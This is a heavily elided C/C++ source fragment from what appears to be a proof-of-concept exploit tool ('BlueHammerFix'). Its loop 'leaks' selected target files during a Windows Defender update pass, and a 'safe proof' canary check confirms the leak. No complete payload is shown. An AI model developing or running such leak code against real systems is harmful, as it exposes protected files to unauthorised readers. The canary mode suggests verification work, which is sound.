// File updated: 2026-09-11 06:48:23 UTC
...
#pragma message("BlueHammerFix protected canary proof enabled: BHF-SAFEPROOF-QUIET-20260911-R9")
...
static const char TRACE_BUILD_ID[] = "BHF-SAFEPROOF-QUIET-20260911-R9";
	...
	try {
		...
		for (int x = 0; x < 1; x++) // single WD update pass — leak selected targets simultaneously (up to 3)
		{
			...
			for (int ri = 0; ri < leakCount; ri++)
			{
				...
				if (opt.safeProofMode)
				{
					size_t proofmagiclength = strlen(SAFE_PROOF_MAGIC);
					if (__readsz < proofmagiclength ||
						memcmp(leakedfilebuff, SAFE_PROOF_MAGIC, proofmagiclength) != 0)
					{
